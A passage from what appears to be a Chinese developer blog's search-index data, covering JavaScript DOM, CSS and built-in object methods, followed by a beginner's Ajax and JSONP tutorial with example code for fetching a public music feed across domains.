//返回当前元素节点的下一个兄弟HTML元素节点Element.previousElementSibling  //返回当前元素节点的前一个兄弟HTML节点Element.offsetParent   //返回当前元素节点的最靠近的、并且CSS的position属性不等于static的父元素。\n\n1.4.2 Element节点的方法\n（1）位置方法\ngetBoundingClientRect()  // getBoundingClientRect返回一个对象，包含top,left,right,bottom,width,height // width、height 元素自身宽高// top 元素上外边界距窗口最上面的距离// right 元素右外边界距窗口最上面的距离// bottom 元素下外边界距窗口最上面的距离// left 元素左外边界距窗口最上面的距离// width 元素自身宽(包含border,padding) // height 元素自身高(包含border,padding) getClientRects()   //返回当前元素在页面上形参的所有矩形。// 元素在页面上的偏移量  var rect = el.getBoundingClientRect()  return &#123;     top: rect.top + document.body.scrollTop,     left: rect.left + document.body.scrollLeft  &#125;\n\n（2）属性方法\nElement.getAttribute()：读取指定属性  Element.setAttribute()：设置指定属性  Element.hasAttribute()：返回一个布尔值，表示当前元素节点是否有指定的属性  Element.removeAttribute()：移除指定属性\n\n（3）查找方法\nElement.querySelector()  Element.querySelectorAll()  Element.getElementsByTagName()  Element.getElementsByClassName()\n\n（4）事件方法\nElement.addEventListener()：添加事件的回调函数  Element.removeEventListener()：移除事件监听函数  Element.dispatchEvent()：触发事件//ie8Element.attachEvent(oneventName,listener)Element.detachEvent(oneventName,listener)// event对象  var event = window.event||event;    // 事件的目标节点  var target = event.target || event.srcElement;// 事件代理  ul.addEventListener(&#x27;click&#x27;, function(event) &#123;     if (event.target.tagName.toLowerCase() === &#x27;li&#x27;) &#123;       console.log(event.target.innerHTML)     &#125;  &#125;);\n\n（5）其他\nElement.scrollIntoView()   //滚动当前元素，进入浏览器的可见区域//解析HTML字符串，然后将生成的节点插入DOM树的指定位置。Element.insertAdjacentHTML(where, htmlString); Element.insertAdjacentHTML(&#x27;beforeBegin&#x27;, htmlString); // 在该元素前插入  Element.insertAdjacentHTML(&#x27;afterBegin&#x27;, htmlString); // 在该元素第一个子元素前插入 Element.insertAdjacentHTML(&#x27;beforeEnd&#x27;, htmlString); // 在该元素最后一个子元素后面插入 Element.insertAdjacentHTML(&#x27;afterEnd&#x27;, htmlString); // 在该元素后插入Element.remove()  //用于将当前元素节点从DOM中移除Element.focus()   //用于将当前页面的焦点，转移到指定元素上\n\n二、CSS操作（1）类名操作\n//ie8以下Element.className  //获取元素节点的类名Element.className += &#x27; &#x27; + newClassName  //新增一个类名//判断是否有某个类名function hasClass(element,className)&#123;  return new RegExp(className,&#x27;gi&#x27;).test(element.className);&#125;//移除classfunction removeClass(element,className)&#123;  element.className = element.className.replace(new RegExp(&#x27;(^|\\\\b)&#x27; + className.split(&#x27; &#x27;).join(&#x27;|&#x27;) + &#x27;(\\\\b|$)&#x27;, &#x27;gi&#x27;),&#x27;&#x27;);&#125;//ie10 element.classList.add(className)  //新增element.classList.remove(className)  //删除element.classList.contains(className)  //是否包含element.classList.toggle(className)  //toggle class\n\n（2）style操作\nelement.setAttribute(&#x27;style&#x27;,&#x27;&#x27;)element.style.backgroundColor = &#x27;red&#x27;element.style.cssText //用来读写或删除整个style属性element.style.setProperty(propertyName,value)  //设置css属性element.style.getPropertyValue(property)  //获取css属性element.style.removeProperty(property)  //删除css属性操作非内联样式//ie8element.currentStyle[attrName]//ie9+window.getComputedStyle(el,null)[attrName] window.getComputedStyle(el,null).getPropertyValue(attrName)//伪类window.getComputedStyle(el,&#x27;:after&#x27;)[attrName]\n\n三、对象3.1 Object对象\n（1）生成实例对象\nvar o = new Object()\n\n（2）属性\nObject.prototype   //返回原型对象\n\n（3）方法\nObject.keys(o)   //遍历对象的可枚举属性Object.getOwnPropertyName(o)   //遍历对象不可枚举的属性\n\n对象实例的方法\nvalueOf()：返回当前对象对应的值。  toString()：返回当前对象对应的字符串形式。  toLocaleString()：返回当前对象对应的本地字符串形式。  hasOwnProperty()：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。 isPrototypeOf()：判断当前对象是否为另一个对象的原型。propertyIsEnumerable()：判断某个属性是否可枚举。\n\n3.2 Array对象\n（1）生成实例对象\nvar a = new Array()\n\n（2）属性\na.length  //长度\n\n（3）Array.isArray()\nArray.isArray(a)   //用来判断一个值是否为数组\n\n（4）Array实例的方法\na.valueof()   //返回数组本身a.toString()  //返回数组的字符串形式a.push(value,vlaue....)   //用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。pop()   //用于删除数组的最后一个元素，并返回该元素join()  //以参数作为分隔符，将所有数组成员组成一个字符串返回。如果不提供参数，默认用逗号分隔。concat()  //用于多个数组的合并。它将新数组的成员，添加到原数组的尾部，然后返回一个新数组，原数组不变。shift()  //用于删除数组的第一个元素，并返回该元素。unshift(value)  //用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。reverse()   //用于颠倒数组中元素的顺序，返回改变后的数组slice(start_index, upto_index);   //用于提取原数组的一部分，返回一个新数组，原数组不变。第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。负数表示倒数第几个。splice(index, count_to_remove, addElement1, addElement2, ...);   //用于删除原数组的一部分成员，并可以在被删除的位置添加入新的数组成员，返回值是被删除的元素。第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。sort()   //对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数，表示按照自定义方法进行排序。该函数本身又接受两个参数，表示进行比较的两个元素。如果返回值大于0，表示第一个元素排在第二个元素后面；其他情况下，都是第一个元素排在第二个元素前面。map()   //对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。map(elem,index,arr)   //map方法接受一个函数作为参数。该函数调用时，map方法会将其传入三个参数，分别是当前成员、当前位置和数组本身。forEach()   //遍历数组的所有成员，执行某种操作,参数是一个函数。它接受三个参数，分别是当前位置的值、当前位置的编号和整个数组。filter()   //参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。some()    //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。只要有一个数组成员的返回值是true，则整个some方法的返回值就是true，否则false。every()   //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。所有数组成员的返回值都是true，才返回true，否则false。reduce()   //依次处理数组的每个成员，最终累计为一个值。从左到右处理（从第一个成员到最后一个成员）reduceRight()  //依次处理数组的每个成员，最终累计为一个值。从右到左（从最后一个成员到第一个成员）indexOf(s)   //返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置lastIndexOf()  //返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。\n\n3.3 Number对象\n（1）生成对象\nvar n = new Number()\n\n（2）Number对象的属性\nNumber.POSITIVE_INFINITY：正的无限，指向Infinity。  Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。  Number.NaN：表示非数值，指向NaN。  Number.MAX_VALUE：表示最大的正数，相应的，最小的负数为-Number.MAX_VALUE。  Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。  Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。  Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。\n\n（4）Number对象实例的方法\ntoString()   //用来将一个数值转为字符串形式.可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。toFixed()   //用于将一个数转为指定位数的小数，返回这个小数对应的字符串。toExponential()  //用于将一个数转为科学计数法形式。可传入一个参数，参数表示小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个RangeError。toPrecision()  //用于将一个数转为指定位数的有效数字。\n\n3.4 String 对象\n（1）生成实例对象\nvar s = new String()\n\n（2）String对象的属性\ns.length   //返回字符串的长度\n\n（3）方法\ns.chatAt(index)   //返回指定位置的字符s.fromCharCode()    //该方法的参数是一系列Unicode码点，返回对应的字符串。s.charCodeAt(index)    //返回给定位置字符的Unicode码点（十进制表示）s.concat(s2)  //用于连接两个字符串s.slice(start,end)   //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。s.substring(start,end)  //用于从原字符串取出子字符串并返回，不改变原字符串.第一个参数表示子字符串的开始位置，第二个位置表示结束位置。s.substr(start,length)   //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的长度。如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。s.indexOf(s)   //返回给定元素在字符串中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置 s.lastIndexOf()  //返回给定元素在字符串中最后一次出现的位置，如果没有出现则返回-1。s.trim()  //用于去除字符串两端的空格，返回一个新字符串s.toLowerCase()  //用于将一个字符串全部转为小写,返回一个新字符串，不改变原字符串。s.toUpperCase()  //全部转为大写s.localeCompare(s2)  //用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。s.match(regexp)   //用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。s.search()  //返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。s.replace(oldValue,newValue)  //用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）。s.split()  //按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。还可传入第二个参数，决定了返回数组的成员数。\n\n3.5 Math对象\n（1）属性\nMath.E：常数e。  Math.LN2：2的自然对数。  Math.LN10：10的自然对数。  Math.LOG2E：以2为底的e的对数。  Math.LOG10E：以10为底的e的对数。  Math.PI：常数Pi。  Math.SQRT1_2：0.5的平方根。  Math.SQRT2：2的平方根。\n\n（2）数学方法\nMath.abs()：返回参数的绝对值  Math.ceil()：向上取整，接受一个参数，返回大于该参数的最小整数。 Math.floor()：向下取整  Math.max(n,n1,...)：可接受多个参数，返回最大值  Math.min(n,n1,..)：可接受多个参数，返回最小值  Math.pow(n,e)：指数运算, 返回以第一个参数为底数、第二个参数为幂的指数值。 Math.sqrt()：返回参数值的平方根。如果参数是一个负值，则返回NaN。  Math.log()：返回以e为底的自然对数值。Math.exp()：返回e的指数，也就是常数e的参数次方。Math.round()：四舍五入  Math.random()：返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。\n\n（3）三角函数方法\nMath.sin()：返回参数的正弦  Math.cos()：返回参数的余弦  Math.tan()：返回参数的正切  Math.asin()：返回参数的反正弦（弧度值）  Math.acos()：返回参数的反余弦（弧度值）  Math.atan()：返回参数的反正切（弧度值）\n\n3.6 JSON对象\n（1）方法\nJSON.stringify()   //用于将一个值转为字符串。该字符串应该符合JSON格式，并且可以被JSON.parse方法还原。//（JSON.stringify(obj, selectedProperties)）还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。//还可以接受第三个参数，用于增加返回的JSON字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。JSON.parse()   //用于将JSON字符串转化成对象。\n\n3.7 console对象\n（1）方法\nconsole.log(text,text2,...)   //用于在console窗口输出信息。它可以接受多个参数，将它们的结果连接起来输出。如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。console.info()   //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.debug()  //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.warn()  //输出信息时，在最前面加一个黄色三角，表示警告；console.error()  //输出信息时，在最前面加一个红色的叉，表示出错，同时会显示错误发生的堆栈console.table()  //可以将复合类型的数据转为表格显示。console.count()  //用于计数，输出它被调用了多少次。console.dir()    //用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。console.dirxml()  //用于以目录树的形式，显示DOM节点。console.assert()  //接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会输出第二个参数，否则不会有任何结果。//这两个方法用于计时，可以算出一个操作所花费的准确时间。console.time()console.timeEnd()//time方法表示计时开始，timeEnd方法表示计时结束。它们的参数是计时器的名称。调用timeEnd方法之后，console窗口会显示“计时器名称: 所耗费的时间”。console.profile()  //用来新建一个性能测试器（profile），它的参数是性能测试器的名字。console.profileEnd()  //用来结束正在运行的性能测试器。console.group()console.groupend()//上面这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。console.groupCollapsed()  //用于将显示的信息分组，该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。console.trace()  //显示当前执行的代码在堆栈中的调用路径。console.clear()  //用于清除当前控制台的所有输出，将光标回置到第一行。","categories":["前端"],"tags":["javascript"]},{"title":"js Ajax总结","url":"/2018/03/03/html+css+js+ts/3-js%E5%BC%82%E6%AD%A5ajax%E6%80%BB%E7%BB%93/","content":"本文主要总结整理Ajax的一些常用的基础知识，适合初学者。\n一、Ajax简介、优劣势、应用场景以及技术\nAjax简介 :\nAsynchronous Javascript And XML （异步的JavaScript和XML）\n它并不是一种单一的技术，而是有机利用一系列交互式网页应用相关的技术所形成的结合体\nAJAX 是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\n\n\n优点：\n页面无刷新，用户体验好。\n异步通信，更加快的响应能力。\n减少冗余请求，减轻了服务器负担\n基于标准化的并被广泛支持的技术，不需要下载插件或者小程序\n\n\n缺点：\najax干掉了back按钮，即对浏览器后退机制的破坏。\n存在一定的安全问题。\n对搜索引擎的支持比较弱。\n破坏了程序的异常机制。\n无法用URL直接访问\n\n\najax应用场景\n场景 1. 数据验证\n场景 2. 按需取数据\n场景 3. 自动更新页面\n\n\nAJAX 包含以下五个部分：ajax并非一种新的技术，而是几种原有技术的结合体。它由下列技术组合而成。\n使用CSS和XHTML来表示。\n使用DOM模型来交互和动态显示。\n数据互换和操作技术，使用XML与XSLT\n使用XMLHttpRequest来和服务器进行异步通信。\n使用javascript来绑定和调用。\n\n\n\n在上面几中技术中，除了XmlHttpRequest对象以外，其它所有的技术都是基于web标准并且已经得到了广泛使用的，XMLHttpRequest虽然目前还没有被W3C所采纳，但是它已经是一个事实的标准，因为目前几乎所有的主流浏览器都支持它\n\n\n第一张图尤其说明了传统Web 应用程序的结构与采用了 AJAX 技术的 Web应用程序的结构上的差别\n主要的差别，其实不是 JavaScript，不是 HTML/XHTML和 CSS，而是采用了 XMLHttpRequest 来向服务器异步的请求 XML 数据\n\n\n\n再来看第二张图，传统的 Web 应用模式，用户的体验是割裂的，点击-&gt;等待-&gt;看到新的页面-&gt;再点击-&gt;再等待。而采用了AJAX技术之后，大部分的计算工作，都是在用户不察觉的情况下，交由服务器去完成了\n\n\n\n二、创建ajax的步骤\nAjax的原理简单来说通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。这其中最关键的一步就是从服务器获得请求数据。原生创建ajax可分为以下四步\n\n1、创建XMLHttpRequest对象Ajax的核心是XMLHttpRequest对象，它是Ajax实现的关键，发送异步请求、接受响应以及执行回调都是通过它来完成\n所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。\n\n创建 XMLHttpRequest对象的语法：\nvar xhr = new XMLHttpRequest();\n\n老版本的 Internet Explorer（IE5 和 IE6）使用ActiveX 对象：\nvar xhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\n\n为了应对所有的现代浏览器，包括 IE5 和 IE6，请检查浏览器是否支持 XMLHttpRequest对象。如果支持，则创建XMLHttpRequest对象。如果不支持，则创建ActiveXObject：\n\n兼容各个浏览器的创建Ajax的工具函数\n\nfunction createRequest ()&#123;\ttry &#123;\t\txhr = new XMLHttpRequest();\t&#125;catch (tryMS)&#123;\t\ttry &#123;\t\t\txhr = new ActiveXObject(&quot;Msxm12.XMLHTTP&quot;);\t\t&#125; catch (otherMS) &#123;\t\t\ttry &#123;\t\t\t\txhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\t\t\t&#125;catch (failed) &#123;\t\t\t\txhr = null;\t\t\t&#125;\t\t&#125;\t&#125;\treturn xhr;&#125;\n\n2、准备请求\n初始化该XMLHttpRequest对象，接受三个参数：\nxhr.open(method,url,async);\n\n第一个参数表示请求类型的字符串，其值可以是GET或者POST。\n\nGET请求：\nxhr.open(&quot;GET&quot;,demo.php?name=tsrot&amp;age=24,true);\n\nPOST请求：\nxhr.open(&quot;POST&quot;,demo.php,true);\n\n第二个参数是要作为请求发送目标的URL。\n\n第三个参数是true或false，表示请求是以异步还是同步的模式发出。（默认为true，一般不建议为false）\n\nfalse：同步模式发出的请求会暂停所有javascript代码的执行，知道服务器获得响应为止，如果浏览器在连接网络时或者在下载文件时出了故障，页面就会一直挂起。\ntrue：异步模式发出的请求，请求对象收发数据的同时，浏览器可以继续加载页面，执行其他javascript代码\n\n\n\n3、发送请求xhr.send();\n\n一般情况下，使用Ajax提交的参数多是些简单的字符串，可以直接使用GET方法将要提交的参数写到open方法的url参数中，此时send方法的参数为null或为空。\n\nGET请求：\nxhr.open(&quot;GET&quot;,demo.php?name=tsrot&amp;age=24,true);xhr.send(null);\n\nPOST请求：如果需要像 HTML 表单那样 POST 数据，请使用 setRequestHeader()来添加 HTTP 头。然后在send()方法中规定您希望发送的数据：\nxhr.open(&quot;POST&quot;,demo.php,true);xhr.setRequestHeder(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;);xhr.sen\n\n4、处理响应xhr.onreadystatechange = function()&#123;\tif(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123;\t\tconsole.log(xhr.responseText);\t&#125;&#125;\n\n\nonreadystatechange ：当处理过程发生变化的时候执行下面的函数\nreadyState ：ajax处理过程\n0：请求未初始化（还没有调用 open()）。\n1：请求已经建立，但是还没有发送（还没有调用 send()）。\n2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。\n3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。\n4：响应已完成；您可以获取并使用服务器的响应了。\n\n\nstatus属性：\n200:”OK”\n404: 未找到页面\n\n\nresponseText：获得字符串形式的响应数据\nresponseXML：获得 XML形式的响应数据\n对象转换为JSON格式使用JSON.stringify\njson转换为对象格式用JSON.parse()\n返回值一般为json字符串，可以用JSON.parse(xhr.responseText)转化为JSON对象\n从服务器传回的数据是json格式，这里做一个例子说明，如何利用\n1、首先需要从XMLHttpRequest对象取回数据这是一个JSON串，把它转换为真正的JavaScript对象。使用JSON.parse(xhr.responseText)转化为JSON对象\n2、遍历得到的数组，向DOM中添加新元素\n\n\n\nfunction example(responseText)&#123;var saleDiv= document.getElementById(&quot;sales&quot;);var sales = JSON.parse(responseText);    for(var i=0;i&lt;sales.length;i++)&#123;        var sale = sales[i];         var div = document.createElement(&quot;div&quot;);         div.setAttribute(&quot;class&quot;,&quot;salseItem&quot;);        div.innerHTML = sale.name + sale.sales;        salseDiv.appendChild(div);    &#125;&#125;\n\n\n5、封装例子\n将AJAX请求封装成ajax()方法，它接受一个配置对象params\n\nfunction ajax(params) &#123;     params = params || &#123;&#125;;     params.data = params.data || &#123;&#125;;     // 判断是ajax请求还是jsonp请求  var json = params.jsonp ? jsonp(params) : json(params);     // ajax请求     function json(params) &#123;       //  请求方式，默认是GET    params.type = (params.type || &#x27;GET&#x27;).toUpperCase();     // 避免有特殊字符，必须格式化传输数据      params.data = formatParams(params.data);       var xhr = null;        // 实例化XMLHttpRequest对象       if(window.XMLHttpRequest) &#123;         xhr = new XMLHttpRequest();       &#125; else &#123;         // IE6及其以下版本         xhr = new ActiveXObjcet(&#x27;Microsoft.XMLHTTP&#x27;);       &#125;;\n\n\n使用实例：\n\najax(&#123;     url: &#x27;test.php&#x27;,   // 请求地址  type: &#x27;POST&#x27;,   // 请求类型，默认&quot;GET&quot;，还可以是&quot;POST&quot;  data: &#123;&#x27;b&#x27;: &#x27;异步请求&#x27;&#125;,   // 传输数据  success: function(res)&#123;   // 请求成功的回调函数    console.log(JSON.parse(res));     &#125;,  error: function(error) &#123;&#125;   // 请求失败的回调函数&#125;);\n\n\n这个过程是一定要记在脑子里的\n\nfunction ajax(url, success, fail)&#123;    // 1. 创建连接    var xhr = null;    xhr = new XMLHttpRequest()    // 2. 连接服务器    xhr.open(&#x27;get&#x27;, url, true)    // 3. 发送请求    xhr.send(null);    // 4. 接受请求    xhr.onreadystatechange = function()&#123;        if(xhr.readyState == 4)&#123;            if(xhr.status == 200)&#123;                success(xhr.responseText);            &#125; else &#123; // fail                fail &amp;&amp; fail(xhr.status);            &#125;        &#125;    &#125;&#125;\n\n\n谈谈JSONP\n要访问web服务器的数据除了XMLHttpRequest外还有一种方法是JSONP\n如果HTML和JavaScript与数据同时在同一个机器上，就可以使用XMLHttpRequest\n什么是JSONP？\nJSONP(JSON with Padding)是一个非官方的协议，它允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）\n\n\nJSONP有什么用？\n由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求\n\n\n如何使用JSONP？\n在客户端声明回调函数之后，客户端通过script标签向服务器跨域请求数据，然后服务端返回相应的数据并动态执行回调函数\n\n\n用XMLHttpRequest时，我们得到一个字符串；要用JSON.parse把字符串转化成对象，使用jsonp时，script标志会解析并执行返回的代码，等我们处理数据时，已经是一个JavaScript对象了\n简单实例\n\n&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt;  &lt;script type=&quot;text/javascript&quot;&gt;      function jsonpCallback(result) &#123;          alert(result.a);          alert(result.b);          alert(result.c);          for(var i in result) &#123;              alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc.          &#125;      &#125;  &lt;/script&gt;  &lt;script type=&quot;text/javascript&quot; src=&quot;http://crossdomain.com/services.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;  &lt;!--callback参数指示生成JavaScript代码时要使用的函数jsonpcallback--&gt;\n\n\n注意浏览器的缓存问题\n在末尾增加一个随机数可避免频繁请求同一个链接出现的缓存问题\n&#96;\n\n\n\n原生JavaScript实现完整的Ajax、JSONP例子\nfunction ajax(params) &#123;\tparams = params || &#123;&#125;;\tparams.data = params.data || &#123;&#125;;\tvar json = params.jsonp ? jsonp(params) : json(params);\t// ajax请求\tfunction json(params) &#123;\t\tparams.type = (params.type || &#x27;GET&#x27;).toUpperCase();\t\tparams.data = formatParams(params.data);\t\tvar xhr = null;\t\t// 实例化XMLHttpRequest对象\t\tif(window.XMLHttpRequest) &#123;\t\t\txhr = new XMLHttpRequest();\t\t&#125; else &#123;\t\t\t// IE6及其以下版本\t\t\txhr = new ActiveXObjcet(&#x27;Microsoft.XMLHTTP&#x27;);\t\t&#125;;\t\t// 监听事件\t\txhr.onreadystatechange = function() &#123;\t\t\tif(xhr.readyState == 4) &#123;\t\t\t\tvar status = xhr.status;\t\t\t\tif(status &gt;= 200 &amp;&amp; status &lt; 300) &#123;\t\t\t\t\tvar response = &#x27;&#x27;;\t\t\t\t\tvar type = xhr.getResponseHeader(&#x27;Content-type&#x27;);\t\t\t\t\tif(type.indexOf(&#x27;xml&#x27;) !== -1 &amp;&amp; xhr.responseXML) &#123;\t\t\t\t\t\tresponse = xhr.responseXML; //Document对象响应\t\t\t\t\t&#125; else if(type === &#x27;application/json&#x27;) &#123;\t\t\t\t\t\tresponse = JSON.parse(xhr.responseText); //JSON响应\t\t\t\t\t&#125; else &#123;\t\t\t\t\t\tresponse = xhr.responseText; //字符串响应\t\t\t\t\t&#125;;\t\t\t\t\tparams.success &amp;&amp; params.success(response);\t\t\t\t&#125; else &#123;\t\t\t\t\tparams.error &amp;&amp; params.error(status);\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;;\t\t// 连接和传输数据\t\tif(params.type == &#x27;GET&#x27;) &#123;\t\t\txhr.open(params.type, params.url + &#x27;?&#x27; + params.data, true);\t\t\txhr.send(null);\t\t&#125; else &#123;\t\t\txhr.open(params.type, params.url, true);\t\t\t//设置提交时的内容类型\t\t\txhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;);\t\t\txhr.send(params.data);\t\t&#125;\t&#125;\t// jsonp请求\tfunction jsonp(params) &#123;\t\t//创建script标签并加入到页面中\t\tvar callbackName = params.jsonp;\t\tvar head = document.getElementsByTagName(&#x27;head&#x27;)[0];\t\t// 设置传递给后台的回调参数名\t\tparams.data[&#x27;callback&#x27;] = callbackName;\t\tvar data = formatParams(params.data);\t\tvar script = document.createElement(&#x27;script&#x27;);\t\thead.appendChild(script);\t\t//创建jsonp回调函数\t\twindow[callbackName] = function(json) &#123;\t\t\thead.removeChild(script);\t\t\tclearTimeout(script.timer);\t\t\twindow[callbackName] = null;\t\t\tparams.success &amp;&amp; params.success(json);\t\t&#125;;\t\t//发送请求\t\tscript.src = params.url + &#x27;?&#x27; + data;\t\t//超时处理\t\tif(params.time) &#123;\t\t\tscript.timer = setTimeout(function() &#123;\t\t\t\twindow[callbackName] = null;\t\t\t\thead.removeChild(script);\t\t\t\tparams.error &amp;&amp; params.error(&#123;\t\t\t\t\tmessage: &#x27;超时&#x27;\t\t\t\t&#125;);\t\t\t&#125;, time);\t\t&#125;\t&#125;;\t//格式化参数\tfunction formatParams(data) &#123;\t\tvar arr = [];\t\tfor(var name in data) &#123;\t\t\tarr.push(encodeURIComponent(name) + &#x27;=&#x27; + encodeURIComponent(data[name]));\t\t&#125;;\t\t// 添加一个随机数，防止缓存\t\tarr.push(&#x27;v=&#x27; + random());\t\treturn arr.join(&#x27;&amp;&#x27;);\t&#125;\t// 获取随机数\tfunction random() &#123;\t\treturn Math.floor(Math.random() * 10000 + 500);\t&#125;&#125;\n\n\n使用\n\najax(&#123;\t\t\t\turl: &#x27;get.php&#x27;,\t\t\t\ttype: &#x27;GET&#x27;,\t\t\t\tdata: &#123;&#x27;intro&#x27;: &#x27;get请求&#x27;&#125;,\t\t\t\tsuccess:function(res)&#123;\t\t\t\t\tres = JSON.parse(res);\t\t\t\t\tdocument.getElementById(&#x27;a&#x27;).innerHTML = res.intro;\t\t\t\t\tconsole.log(res);\t\t\t\t&#125;\t\t\t&#125;);\t\tajax(&#123;\t\t\t\turl: &#x27;post.php&#x27;,\t\t\t\ttype: &#x27;POST&#x27;,\t\t\t\tdata: &#123;&#x27;intro&#x27;: &#x27;post请求&#x27;&#125;,\t\t\t\tsuccess:function(res)&#123;\t\t\t\t\tres = JSON.parse(res);\t\t\t\t\tdocument.getElementById(&#x27;b&#x27;).innerHTML = res.intro;\t\t\t\t\tconsole.log(res);\t\t\t\t&#125;\t\t\t&#125;);\t\tajax(&#123;\t\t\t\turl: &#x27;http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js&#x27;,\t\t\t\tjsonp: &#x27;jsonpCallback&#x27;,\t\t\t\tdata: &#123;&#x27;callback&#x27;: &#x27;jsonpCallback&#x27;&#125;,\t\t\t\tsuccess:function(res)&#123;\t\t\t\t\tJsonCallback(json);\t\t\t\t&#125;\t\t\t&#125;);\n\n\n下面我们就根据以上 封装的例子跨域获取qq音乐的数据\n\n\n在线演示–跨域获取qq音乐的数据\n\n下面的方法也可以实现\n\n使用jQuery实现\n\n&lt;script src=&quot;jquery-3.1.0.min.js&quot;&gt;&lt;/script&gt;\t\t&lt;script type=&quot;text/javascript&quot;&gt;\t\t\t$.ajax(&#123;\t\t\t\t  type: &quot;get&quot;,\t\t\t\t  async: false,\t\t\t\t  url: &quot;http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js&quot;,\t\t\t\t  dataType: &quot;jsonp&quot;,\t\t\t\t  jsonp: &quot;callback&quot;,\t\t\t\t  jsonpCallback: &quot;JsonCallback&quot;,\t\t\t\t  scriptCharset: &#x27;GBK&#x27;,//设置编码，否则会乱码\t\t\t\t  success: function(data) &#123;\t\t\t\t    //var result = JSON.stringify(data);\t\t\t\t\t  JsonCallback(data);\t\t\t\t  &#125;,\t\t\t\t  error: function() &#123;\t\t\t\t    alert(&#x27;fail&#x27;);\t\t\t\t  &#125;\t\t\t\t&#125;);\t\t\tfunction JsonCallback(json)&#123;\t\t\t\tvar data = json.songlist;\t\t\t\tvar html = &#x27;&#x27;;\t\t\t\tfor (var i=0;i&lt;data.length;i++) &#123;\t\t\t\t\tdocument.write(data[i].url+&quot;&lt;br&gt;&quot;);\t\t\t\t&#125;\t\t\t&#125;\t\t&lt;/script&gt;​```      - 原生js简洁实现​```javascriptvar script = document.createElement(&quot;script&quot;);\t\t\tscript.src = &#x27;http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js?callback=JsonCallback&#x27;;\t\t\tdocument.body.appendChild(script);\t\t\tfunction JsonCallback(json)&#123;\t\t\t\tvar data = json.songlist;\t\t\t\tvar html = &#x27;&#x27;;\t\t\t\tfor (var 